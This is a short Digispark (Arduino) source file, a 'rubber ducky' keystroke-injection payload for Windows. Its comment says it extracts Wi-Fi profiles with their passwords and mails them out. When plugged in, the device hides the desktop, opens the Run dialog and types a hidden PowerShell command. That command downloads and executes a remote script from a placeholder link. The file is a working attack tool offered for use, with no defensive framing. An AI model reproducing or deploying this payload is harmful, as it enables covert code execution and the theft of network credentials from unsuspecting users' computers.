//A Digispark rubber ducky script for Windows to Extract and Mail Wifi profiles (SSID, password) in plain text format.

#include "DigiKeyboard.h"

void setup()


{
	
	pinMode(1, OUTPUT);
	
	//-->Initial Delay
  DigiKeyboard.delay(2000);
  
   // --> Obfuscate the command prompt
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);    
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  
  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('YOUR-DOWNLOAD-LINK-WIFI.PS1');\""));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


}

void loop() {


   digitalWrite(1, HIGH);
  delay(1000);               // wait for a second
  digitalWrite(1, LOW); 
  delay(1000);          
}


